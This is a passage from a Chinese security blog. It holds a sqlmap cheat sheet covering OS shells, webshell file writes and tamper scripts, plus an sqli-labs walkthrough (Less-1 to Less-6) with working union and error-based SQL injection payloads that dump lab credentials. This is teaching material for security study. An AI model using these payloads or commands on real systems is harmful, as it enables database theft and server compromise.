-<p><code>sqlmap -u &quot;http://192.168.159.1/news.php?id=1&quot; -v 3 --dbs --batch --tamper &quot;space2morehash.py&quot;</code></p>
-<p>space2morehash.py中可以替换space2hash.py或者base64encode.py或者charencode.py  </p>
-<p>都是编码方式</p>
-<p>space2hash.py base64encode.py charencode.py</p>
-<h1><span id="sqlmap查看权限">SQLMAP查看权限</span></h1><p><code>sqlmap -u &quot;http://192.168.159.1/news.php?id=1&quot; --privileges</code></p>
-<h1><span id="sqlmap伪静态注入">SQLMAP伪静态注入</span></h1><ol>
-<li><p>查找数据库<br><code>sqlmap -u &quot;http://xxx.cn/index.php/Index/view/id/40.html&quot; --dbs</code></p>
-</li>
-<li><p>通过1中的数据库查找对应的表 (假如通过1，得到的是dataname)<br><code>sqlmap -u &quot;http://xxx.cn/index.php/Index/view/id/40.html&quot; -D dataname --tables</code></p>
-</li>
-</ol>
-<ol start="3">
-<li>通过2中的数据表得到字段(假如得到的是tablename表)</li>
-</ol>
-<p><code>sqlmap -u &quot;http://xxx.cn/index.php/Index/view/id/40.html&quot; -D dataname -T
-tablename --columns</code></p>
-<ol start="4">
-<li>通过3得到字段值(假如从3中得到字段id，password)</li>
-</ol>
-<p><code>sqlmap -u &quot;http://xxx.cn/index.php/Index/view/id/40.html&quot; -D dataname -T
-tablename -C &quot;password&quot; --dump</code></p>
-<h1><span id="sqlmap注入点执行命令与交互写shell">SQLMAP注入点执行命令与交互写shell</span></h1><p>(1) 注入点：<a href="http://192.168.159.1/news.php?id=1" target="_blank" rel="noopener">http://192.168.159.1/news.php?id=1</a> </p>
-<p><code>sqlmap -u &quot;http://192.168.159.1/news.php?id=1&quot;--os-cmd=ipconfig</code></p>
-<p>(2) 获取shell<br><code>sqlmap -u &quot;http://192.168.159.1/news.php?id=1&quot; --os-shell</code></p>
-<p>出现语言的选择根据实际的测试网站选择语言</p>
-<p>从数据库中搜索字段<br><code>sqlmap -r “c:\tools\request.txt” –dbms mysql -D dedecms –search -C admin,password</code><br>在dedecms数据库中搜索字段admin或者password。</p>
-<p>读取与写入文件<br>首先找需要网站的物理路径，其次需要有可写或可读权限。</p>
-<p>–file-read=RFILE 从后端的数据库管理系统文件系统读取文件 （物理路径）</p>
-<p>–file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件 （mssql xp_shell）</p>
-<p>–file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径</p>
-<p>例<br><code>sqlmap -r “c:\request.txt” -p id –dbms mysql –file-dest “e:\php\htdocs\dvwa\inc\include\1.php” –file-write “f:\webshell\1112.php”</code></p>
-<p><code>sqlmap -r &quot;c:\tools\request.txt&quot; -p id –dms mysql –os-shell</code></p>
-<p>接下来指定网站可写目录：</p>
-<p>“E:\php\htdocs\dvwa”</p>
-<p>#注：mysql不支持列目录，仅支持读取单个文件。sqlserver可以列目录，不能读写文件，但需要一个（xp_dirtree函数）</p>
-<h1><span id="sqlmap详细命令">sqlmap详细命令：</span></h1><p>-is-dba 当前用户权限（是否为root权限）</p>
-<p>-dbs 所有数据库</p>
-<p>-current-db 网站当前数据库</p>
-<p>-users 所有数据库用户</p>
-<p>-current-user 当前数据库用户</p>
-<p>-random-agent 构造随机user-agent</p>
-<p>-passwords 数据库密码</p>
-<p>-proxy <a href="http://local:8080" target="_blank" rel="noopener">http://local:8080</a> –threads 10 (可以自定义线程加速) 代理</p>
-<p>-time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）</p>
-<h2><span id="options选项">Options（选项）：</span></h2><p>-version 显示程序的版本号并退出</p>
-<p>-h, –help 显示此帮助消息并退出</p>
-<p>-v VERBOSE 详细级别：0-6（默认为1）</p>
-<h2><span id="target目标">Target（目标）：</span></h2><p>以下至少需要设置其中一个选项，设置目标URL。</p>
-<p>-d DIRECT 直接连接到数据库。</p>
-<p>-u URL, –url=URL 目标URL。</p>
-<p>-l LIST 从Burp或WebScarab代理的日志中解析目标。</p>
-<p>-r REQUESTFILE 从一个文件中载入HTTP请求。</p>
-<p>-g GOOGLEDORK 处理Google dork的结果作为目标URL。</p>
-<p>-c CONFIGFILE 从INI配置文件中加载选项。</p>
-<h2><span id="request请求">Request（请求）：</span></h2><p>这些选项可以用来指定如何连接到目标URL。</p>
-<p>-data=DATA 通过POST发送的数据字符串</p>
-<p>-cookie=COOKIE HTTP Cookie头</p>
-<p>-cookie-urlencode URL 编码生成的cookie注入</p>
-<p>-drop-set-cookie 忽略响应的Set – Cookie头信息</p>
-<p>-user-agent=AGENT 指定 HTTP User – Agent头</p>
-<p>-random-agent 使用随机选定的HTTP User – Agent头</p>
-<p>-referer=REFERER 指定 HTTP Referer头</p>
-<p>-headers=HEADERS 换行分开，加入其他的HTTP头</p>
-<p>-auth-type=ATYPE HTTP身份验证类型（基本，摘要或NTLM）(Basic, Digest or NTLM)</p>
-<p>-auth-cred=ACRED HTTP身份验证凭据（用户名:密码）</p>
-<p>-auth-cert=ACERT HTTP认证证书（key_file，cert_file）</p>
-<p>-proxy=PROXY 使用HTTP代理连接到目标URL</p>
-<p>-proxy-cred=PCRED HTTP代理身份验证凭据（用户名：密码）</p>
-<p>-ignore-proxy 忽略系统默认的HTTP代理</p>
-<p>-delay=DELAY 在每个HTTP请求之间的延迟时间，单位为秒</p>
-<p>-timeout=TIMEOUT 等待连接超时的时间（默认为30秒）</p>
-<p>-retries=RETRIES 连接超时后重新连接的时间（默认3）</p>
-<p>-scope=SCOPE 从所提供的代理日志中过滤器目标的正则表达式</p>
-<p>-safe-url=SAFURL 在测试过程中经常访问的url地址</p>
-<p>-safe-freq=SAFREQ 两次访问之间测试请求，给出安全的URL</p>
-<h2><span id="enumeration枚举">Enumeration（枚举）：</span></h2><p>这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，还可以运行自己的SQL语句。</p>
-<p>-b, –banner 检索数据库管理系统的标识</p>
-<p>-current-user 检索数据库管理系统当前用户</p>
-<p>-current-db 检索数据库管理系统当前数据库</p>
-<p>-is-dba 检测DBMS当前用户是否DBA</p>
-<p>-users 枚举数据库管理系统用户</p>
-<p>-passwords 枚举数据库管理系统用户密码哈希</p>
-<p>-privileges 枚举数据库管理系统用户的权限</p>
-<p>-roles 枚举数据库管理系统用户的角色</p>
-<p>-dbs 枚举数据库管理系统数据库</p>
-<p>-D DBname 要进行枚举的指定数据库名</p>
-<p>-T TBLname 要进行枚举的指定数据库表（如：-T tablename –columns）</p>
-<p>-tables 枚举的DBMS数据库中的表</p>
-<p>-columns 枚举DBMS数据库表列</p>
-<p>-dump 转储数据库管理系统的数据库中的表项</p>
-<p>-dump-all 转储所有的DBMS数据库表中的条目</p>
-<p>-search 搜索列（S），表（S）和/或数据库名称（S）</p>
-<p>-C COL 要进行枚举的数据库列</p>
-<p>-U USER 用来进行枚举的数据库用户</p>
-<p>-exclude-sysdbs 枚举表时排除系统数据库</p>
-<p>-start=LIMITSTART 第一个查询输出进入检索</p>
-<p>-stop=LIMITSTOP 最后查询的输出进入检索</p>
-<p>-first=FIRSTCHAR 第一个查询输出字的字符检索</p>
-<p>-last=LASTCHAR 最后查询的输出字字符检索</p>
-<p>-sql-query=QUERY 要执行的SQL语句</p>
-<p>-sql-shell 提示交互式SQL的shell</p>
-<h2><span id="optimization优化">Optimization（优化）：</span></h2><p>这些选项可用于优化SqlMap的性能。</p>
-<p>-o 开启所有优化开关</p>
-<p>–predict-output 预测常见的查询输出</p>
-<p>–keep-alive 使用持久的HTTP（S）连接</p>
-<p>–null-connection 从没有实际的HTTP响应体中检索页面长度</p>
-<p>–threads=THREADS 最大的HTTP（S）请求并发量（默认为1）</p>
-<h2><span id="injection注入">Injection（注入）：</span></h2><p>这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。</p>
-<p>-p TESTPARAMETER 可测试的参数（S）</p>
-<p>–dbms=DBMS 强制后端的DBMS为此值</p>
-<p>–os=OS 强制后端的DBMS操作系统为这个值</p>
-<p>–prefix=PREFIX 注入payload字符串前缀</p>
-<p>–suffix=SUFFIX 注入payload字符串后缀</p>
-<p>–tamper=TAMPER 使用给定的脚本（S）篡改注入数据</p>
-<h2><span id="detection检测">Detection（检测）：</span></h2><p>这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。</p>
-<p>–level=LEVEL 执行测试的等级（1-5，默认为1）</p>
-<p>–risk=RISK 执行测试的风险（0-3，默认为1）</p>
-<p>–string=STRING 查询时有效时在页面匹配字符串</p>
-<p>–regexp=REGEXP 查询时有效时在页面匹配正则表达式</p>
-<p>–text-only 仅基于在文本内容比较网页</p>
-<p>Techniques（技巧）：<br>这些选项可用于调整具体的SQL注入测试。</p>
-<p>–technique=TECH SQL注入技术测试（默认BEUST）</p>
-<p>–time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）</p>
-<p>–union-cols=UCOLS 定列范围用于测试UNION查询注入</p>
-<p>–union-char=UCHAR 用于暴力猜解列数的字符</p>
-<h2><span id="fingerprint指纹">Fingerprint（指纹）：</span></h2><p>-f, –fingerprint 执行检查广泛的DBMS版本指纹</p>
-<h2><span id="brute-force蛮力">Brute force（蛮力）：</span></h2><p>这些选项可以被用来运行蛮力检查。</p>
-<p>–common-tables 检查存在共同表</p>
-<p>–common-columns 检查存在共同列</p>
-<h2><span id="user-defined-function-injection用户自定义函数注入">User-defined function injection（用户自定义函数注入）：</span></h2><p>这些选项可以用来创建用户自定义函数。</p>
-<p>–udf-inject 注入用户自定义函数</p>
-<p>–shared-lib=SHLIB 共享库的本地路径</p>
-<h2><span id="file-system-access访问文件系统">File system access（访问文件系统）：</span></h2><p> 这些选项可以被用来访问后端数据库管理系统的底层文件系统。</p>
-<p> –file-read=RFILE 从后端的数据库管理系统文件系统读取文件</p>
-<p>–file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件</p>
-<p>–file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径</p>
-<h2><span id="operating-system-access操作系统访问">Operating system access（操作系统访问）：</span></h2><p>这些选项可以用于访问后端数据库管理系统的底层操作系统。</p>
-<p>–os-cmd=OSCMD 执行操作系统命令</p>
-<p>–os-shell 交互式的操作系统的shell</p>
-<p>–os-pwn 获取一个OOB shell，meterpreter或VNC</p>
-<p>–os-smbrelay 一键获取一个OOB shell，meterpreter或VNC</p>
-<p>–os-bof 存储过程缓冲区溢出利用</p>
-<p>–priv-esc 数据库进程用户权限提升</p>
-<p>–msf-path=MSFPATH Metasploit Framework本地的安装路径</p>
-<p>–tmp-path=TMPPATH 远程临时文件目录的绝对路径</p>
-<h2><span id="windows注册表访问">Windows注册表访问：</span></h2><p>这些选项可以被用来访问后端数据库管理系统Windows注册表。</p>
-<p>–reg-read 读一个Windows注册表项值</p>
-<p>–reg-add 写一个Windows注册表项值数据</p>
-<p>–reg-del 删除Windows注册表键值</p>
-<p>–reg-key=REGKEY Windows注册表键</p>
-<p>–reg-value=REGVAL Windows注册表项值</p>
-<p>–reg-data=REGDATA Windows注册表键值数据</p>
-<p>–reg-type=REGTYPE Windows注册表项值类型</p>
-<p>这些选项可以用来设置一些一般的工作参数。</p>
-<p>-t TRAFFICFILE 记录所有HTTP流量到一个文本文件中</p>
-<p>-s SESSIONFILE 保存和恢复检索会话文件的所有数据</p>
-<p>–flush-session 刷新当前目标的会话文件</p>
-<p>–fresh-queries 忽略在会话文件中存储的查询结果</p>
-<p>–eta 显示每个输出的预计到达时间<br>–update 更新SqlMap</p>
-<p>–save file保存选项到INI配置文件</p>
-<p>–batch 从不询问用户输入，使用所有默认配置。</p>
-<h2><span id="miscellaneous杂项">Miscellaneous（杂项）：</span></h2><p>–beep 发现SQL注入时提醒</p>
-<p>–check-payload IDS对注入payloads的检测测试</p>
-<p>–cleanup SqlMap具体的UDF和表清理DBMS</p>
-<p>–forms 对目标URL的解析和测试形式</p>
-<p>–gpage=GOOGLEPAGE 从指定的页码使用谷歌dork结果</p>
-<p>–page-rank Google dork结果显示网页排名（PR）</p>
-<p>–parse-errors 从响应页面解析数据库管理系统的错误消息</p>
-<p>–replicate 复制转储的数据到一个sqlite3数据库</p>
-<p>–tor 使用默认的Tor（Vidalia/ Privoxy/ Polipo）代理地址</p>
-<p>–wizard 给初级用户的简单向导界面</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">工具</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">sql注入</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/04/26/sqlmap/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-sqlilabs" class="article article-type-post  article-index" itemscope="" itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/04/25/sqlilabs/">sqlilabs</a>
-    </h1>
-  
-
-        
-        <a href="/2020/04/25/sqlilabs/" class="archive-article-date">
-  	<time datetime="2020-04-25T09:15:54.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-04-25</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>[toc]</p>
-<h2><span id="相关知识">相关知识</span></h2><ol>
-<li><p>mysql<br>单行注释有#和–。<br>在实际操作中#号一般用%23来表示。–则用–+来表示。因为在URL中，如果在最后加上– ，浏览器在发送请求的时候会把URL末尾的空格舍去，而用–+代替–，原因是+在URL被URL编码后会变成空格。</p>
-</li>
-<li><p>与数据库相关的内容：</p>
-</li>
-</ol>
-<ul>
-<li>information_schema，系统数据库，包含所有数据库相关信息。</li>
-<li>information_schema.schemata中schema_name列，字段为所有数据库名称。</li>
-<li>information_schema.tables中table_name列对应数据库所有表名，其中table_schema列是所有数据库名。</li>
-<li>information_schema.columns中，column_name列对应所有列名，其中table_schema列也对应所有数据库名，table_name列也对应所有表名。</li>
-</ul>
-<ol start="3">
-<li>联合查询时需要将前面的查询结果限定为空集，后面的查询结果才能显示出来。</li>
-<li>concat(),concat_ws()与及group_concat()的用法<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">concat(str1, str2,...)</span><br><span class="line">返回结果为连接参数产生的字符串，如果有任何一个参数为null，则返回值为null。</span><br></pre></td></tr></table></figure>
-</li>
-</ol>
-<p><img src="https://ss2.baidu.com/6ONYsjip0QIZ8tyhnq/it/u=2595155708,2358396591&amp;fm=173&amp;app=25&amp;f=JPEG?w=450&amp;h=258&amp;s=73B2CC6C9BE6EF7C5A369613020000DD" alt=""></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">concat_ws()</span><br><span class="line">1、功能：和concat()一样，将多个字符串连接成一个字符串，但是可以一次性指定分隔符～（concat_ws就是concat with separator）</span><br><span class="line"></span><br><span class="line">2、语法：concat_ws(separator, str1, str2, ...)</span><br></pre></td></tr></table></figure>
-<p><img src="https://ss2.baidu.com/6ONYsjip0QIZ8tyhnq/it/u=2595155708,2358396591&amp;fm=173&amp;app=25&amp;f=JPEG?w=450&amp;h=258&amp;s=73B2CC6C9BE6EF7C5A369613020000DD" alt=""></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">group_concat()</span><br><span class="line">1、功能：将group by产生的同一个分组中的值连接起来，返回一个字符串结果。</span><br><span class="line"></span><br><span class="line">2、语法：group_concat( [distinct] 要连接的字段 [order by 排序字段 asc/desc ] [separator &apos;分隔符&apos;] )</span><br><span class="line"></span><br><span class="line">说明：通过使用distinct可以排除重复值；如果希望对结果中的值进行排序，可以使用</span><br><span class="line">order by子句；separator是一个字符串值，缺省为一个逗号。</span><br></pre></td></tr></table></figure>
-<p><img src="https://ss2.baidu.com/6ONYsjip0QIZ8tyhnq/it/u=53485535,941408993&amp;fm=173&amp;app=25&amp;f=JPEG?w=487&amp;h=209&amp;s=73B2EC6C1EE0FD64583A9613020000DD" alt=""></p>
-<h2><span id="题目">题目</span></h2><h3><span id="less-1-单引号字符型">Less-1 单引号字符型</span></h3><p>查询语句<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure></p>
-<p><a href="http://118.31.21.145:32769/Less-1/?id=1" target="_blank" rel="noopener">http://118.31.21.145:32769/Less-1/?id=1</a><br>回显正常</p>
-<p>加个单引号<br><a href="http://118.31.21.145:32769/Less-1/?id=1%27" target="_blank" rel="noopener">http://118.31.21.145:32769/Less-1/?id=1%27</a><br>显示语句出错</p>
-<p><a href="http://118.31.21.145:32769/Less-1/?id=1%27%20%23" target="_blank" rel="noopener">http://118.31.21.145:32769/Less-1/?id=1%27%20%23</a><br>或<br><a href="http://118.31.21.145:32769/Less-1/?id=1%27%20and%20%20%271%27=%271" target="_blank" rel="noopener">http://118.31.21.145:32769/Less-1/?id=1%27%20and%20%20%271%27=%271</a><br>或<br><a href="http://118.31.21.145:32769/Less-1/?id=1%27%20--+" target="_blank" rel="noopener">http://118.31.21.145:32769/Less-1/?id=1%27%20--+</a><br>成功闭合</p>
-<p>118.31.21.145:32769/Less-1/?id=1’ order by 3 –+<br>order by 4时出错<br>所以得出列数为3</p>
-<p>union注入 爆数据库名<br><a href="http://118.31.21.145:32769/Less-1/?id=-1%27%20union%20select%201,group_concat(schema_name),3%20from%20information_schema.schemata%20--+" target="_blank" rel="noopener">http://118.31.21.145:32769/Less-1/?id=-1%27%20union%20select%201,group_concat(schema_name),3%20from%20information_schema.schemata%20--+</a>  </p>
-<p>1,group_concat(schema_name),3<br>是因为查询语句select了三个字段 上面group by得知的</p>
-<p>爆security数据库的表<br><a href="http://118.31.21.145:32769/Less-1/?id=-1%27%20union%20select%201,group_concat(table_name),3%20from%20information_schema.tables%20where%20table_schema=%27security%27--+" target="_blank" rel="noopener">http://118.31.21.145:32769/Less-1/?id=-1%27%20union%20select%201,group_concat(table_name),3%20from%20information_schema.tables%20where%20table_schema=%27security%27--+</a></p>
-<p>爆user表的列<br><a href="http://118.31.21.145:32769/Less-1/?id=-1%27%20union%20select%201,group_concat(column_name),3%20from%20information_schema.columns%20where%20table_name=%22users%22--+" target="_blank" rel="noopener">http://118.31.21.145:32769/Less-1/?id=-1%27%20union%20select%201,group_concat(column_name),3%20from%20information_schema.columns%20where%20table_name=%22users%22--+</a></p>
-<p>爆所有用户名 密码<br><a href="http://118.31.21.145:32769/Less-1/?id=-1%27%20union%20select%201,group_concat(concat_ws(%27:%27,username,password)),3%20from%20users--+" target="_blank" rel="noopener">http://118.31.21.145:32769/Less-1/?id=-1%27%20union%20select%201,group_concat(concat_ws(%27:%27,username,password)),3%20from%20users--+</a><br>或<br><a href="http://118.31.21.145:32769/Less-1/?id=-1%27%20union%20select%201,group_concat(username),group_concat(password)%20from%20users%20--+" target="_blank" rel="noopener">http://118.31.21.145:32769/Less-1/?id=-1%27%20union%20select%201,group_concat(username),group_concat(password)%20from%20users%20--+</a></p>
-<p>完成</p>
-<hr>
-<p>sqlmap</p>
-<p>python sqlmap.py -u <a href="http://118.31.21.145:32769/Less-1/?id=-1" target="_blank" rel="noopener">http://118.31.21.145:32769/Less-1/?id=-1</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">back-end DBMS: MySQL 5</span><br><span class="line">得到数据库类型 mysql</span><br></pre></td></tr></table></figure></p>
-<p>python sqlmap.py -u <a href="http://118.31.21.145:32769/Less-1/?id=-1" target="_blank" rel="noopener">http://118.31.21.145:32769/Less-1/?id=-1</a> –dbms mysql –dbs</p>
-<p>得到数据库名<br>available databases [5]:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[*] challenges</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] security</span><br></pre></td></tr></table></figure></p>
-<p>python sqlmap.py -u <a href="http://118.31.21.145:32769/Less-1/?id=-1" target="_blank" rel="noopener">http://118.31.21.145:32769/Less-1/?id=-1</a> –dbms mysql –dbs -D security –tables<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">+----------+</span><br><span class="line">| emails   |</span><br><span class="line">| referers |</span><br><span class="line">| uagents  |</span><br><span class="line">| users    |</span><br><span class="line">+----------+</span><br></pre></td></tr></table></figure></p>
-<p>得到表名</p>
-<p>python sqlmap.py -u <a href="http://118.31.21.145:32769/Less-1/?id=-1" target="_blank" rel="noopener">http://118.31.21.145:32769/Less-1/?id=-1</a> –dbms mysql –dbs -D security -T users –columns<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">+----------+-------------+</span><br><span class="line">| Column   | Type        |</span><br><span class="line">+----------+-------------+</span><br><span class="line">| id       | int(3)      |</span><br><span class="line">| password | varchar(20) |</span><br><span class="line">| username | varchar(20) |</span><br><span class="line">+----------+-------------+</span><br></pre></td></tr></table></figure></p>
-<p>得到user表中的所有字段</p>
-<p>python sqlmap.py -u <a href="http://118.31.21.145:32769/Less-1/?id=-1" target="_blank" rel="noopener">http://118.31.21.145:32769/Less-1/?id=-1</a> –dbms mysql –dbs -D security -T users -C username,password –dump<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">+----------+------------+</span><br><span class="line">| username | password   |</span><br><span class="line">+----------+------------+</span><br><span class="line">| Dumb     | Dumb       |</span><br><span class="line">| Angelina | I-kill-you |</span><br><span class="line">| Dummy    | p@ssword   |</span><br><span class="line">| secure   | crappy     |</span><br><span class="line">| stupid   | stupidity  |</span><br><span class="line">| superman | genious    |</span><br><span class="line">| batman   | mob!le     |</span><br><span class="line">| admin    | admin      |</span><br><span class="line">| admin1   | admin1     |</span><br><span class="line">| admin2   | admin2     |</span><br><span class="line">| admin3   | admin3     |</span><br><span class="line">| dhakkan  | dumbo      |</span><br><span class="line">| admin4   | admin4     |</span><br><span class="line">+----------+------------+</span><br></pre></td></tr></table></figure></p>
-<p>成功得到用户信息</p>
-<h3><span id="less-2-字符型">Less-2 字符型</span></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=$id LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure>
-<p>相比less-1 少了’’ 把less-1的payload用来闭合的’去掉就行了</p>
-<p>payload：<code>http://118.31.21.145:32769/Less-2/?id=-1%20union%20select%201,group_concat(%27|%27,username,%27,%27,password,%27|%27),3%20from%20users%20--+</code></p>
-<p>需要让第一个查询id=-1是因为sql查询语句后面有 <code>limit 0,1</code> 。若id=1，则只显示第一条id=1的查询结果，union 查询结果不显示。</p>
-<h3><span id="less-3">less-3</span></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=('$id') LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure>
-<p>需要<code>&#39;)</code>来闭合<br>payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://118.31.21.145:32769/Less-3/?id=-1%27)%20union%20select%201,group_concat(%27|%27,username,%27,%27,password,%27|%27),3%20from%20users%20--+</span><br></pre></td></tr></table></figure></p>
-<h3><span id="less-4">less-4</span></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=($id) LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure>
-<p>用<code>&quot;)</code>闭合<br>payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://118.31.21.145:32769/Less-4/?id=-1%22)%20union%20select%201,group_concat(%27|%27,username,%27,%27,password,%27|%27),3%20from%20users%20%20--+</span><br></pre></td></tr></table></figure></p>
-<h3><span id="less-5">less-5</span></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"><span class="keyword">if</span>($row)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'You are in...........'</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    print_r(mysql_error());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>报错注入<br>payload</p>
-<p>extractvalue() :对XML文档进行查询的函数<br>updatexml()：与extractvalue()类似，是更新xml文档的函数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">数据库名</span><br><span class="line">http://118.31.21.145:32769/Less-5/?id=1%27%20%20and%20updatexml(1,concat(0x7e,database(),0x7e),1)%20--+</span><br><span class="line"># 0x7e是十六进制的~，让查询结果更显眼。 </span><br><span class="line"></span><br><span class="line">表名</span><br><span class="line">http://118.31.21.145:32769/Less-5/?id=1%27%20%20and%20updatexml(1,concat(0x7e,(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database())%20,0x7e),1)%20--+</span><br><span class="line"></span><br><span class="line">字段</span><br><span class="line">http://118.31.21.145:32769/Less-5/?id=1%27%20%20and%20updatexml(1,concat(0x7e,(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_schema=database()%20and%20table_name=%22users%22),0x7e),1)%20--+</span><br><span class="line"></span><br><span class="line">数据</span><br><span class="line">118.31.21.145:32769/Less-5/?id=1&apos;%20 and updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),1) --+</span><br><span class="line"># updatexml（）这个函数最多只能爆32位字符，所以用使用limit 0，1一个一个查</span><br></pre></td></tr></table></figure></p>
-<p>sqlmap：<br><code>sqlmap -u http://118.31.21.145:32769/Less-5/?id=1%27 -D security -T users -C username,password --dump</code></p>
-<h3><span id="less-6">less-6</span></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=$id LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'You are in...........'</span>;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">    print_r(mysql_error());</span><br></pre></td></tr></table></figure>
-<p>同样是报错注入，与less-5相比使用<code>&quot;</code>进行闭合</p>
-<p>payload<br><code>http://118.31.21.145:32769/Less-6/?id=1%22%20and%20updatexml(1,concat(0x7e,(select%20password%20from%20users%20limit%201,1),0x7e),1)%20--+</code></p>
